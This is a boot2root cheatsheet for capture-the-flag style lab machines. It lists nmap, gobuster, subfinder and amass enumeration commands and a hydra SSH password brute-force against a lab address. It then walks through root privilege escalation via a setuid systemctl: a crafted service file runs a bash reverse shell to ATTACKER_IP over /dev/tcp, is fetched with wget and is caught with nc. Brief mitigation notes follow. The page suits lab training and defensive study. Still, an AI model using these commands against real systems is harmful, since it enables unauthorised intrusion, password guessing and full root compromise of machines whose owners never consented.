# Boot2Root Cheatsheet


## **Enumeration**
### **Network Scanning**
```bash
nmap -sn [Subnet]     nmap -sn 192.168.80.0/24          # Ping sweep for live hosts

nmap -sC -sV -oN nmap_initial.txt [Target IP]  # Basic scan

nmap -A -p- -oN nmap_full.txt [Target IP]     # Aggressive scan

```

### **Web Enumeration**
```bash
gobuster dir -e -u http://10.10.181.27 -w /home/iftx/Desktop/Room/wordlist/common.txt -x .php,.txt,.js,.html

subfinder -d [Target Domain]     # Find subdomains

amass enum -d [Target Domain]    # Active enumeration
```

### **Service Enumeration**
```bash
hydra -l user_ name -P /home/iftx/Desktop/Room/wordlist/rockyou.txt 10.10.181.27 ssh

```
## Privilege Escalation

<details>
  <summary>
  Privilege Escalation via Misconfigured setuid Binary (systemctl)
    
  </summary>



## Exploit Steps

1. Find setuid binaries owned by root:

```bash
find / -user root -perm -4000 -print 2>/dev/null

```
If /bin/systemctl has setuid, it can be abused.

2. Create a malicious service (root.service):

```
ini
Copy
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

[Install]
WantedBy=multi-user.target

```

3. Host the service & transfer to target:
Start HTTP server:

```python -m http.server 80```
On target, download:


```wget http://ATTACKER_IP/root.service -O /tmp/root.service```

4. Enable & start the service:
```
systemctl enable /tmp/root.service  # Uses setuid to gain root
systemctl start root

```

5. Get root shell:
Attacker listens:

```
nc -lvnp PORT
```
Service executes reverse shell as root.

### Mitigation
Remove setuid from systemctl:


chmod u-s /bin/systemctl
Restrict service file creation in /tmp (use noexec)

Monitor for unusual service activations

</details>


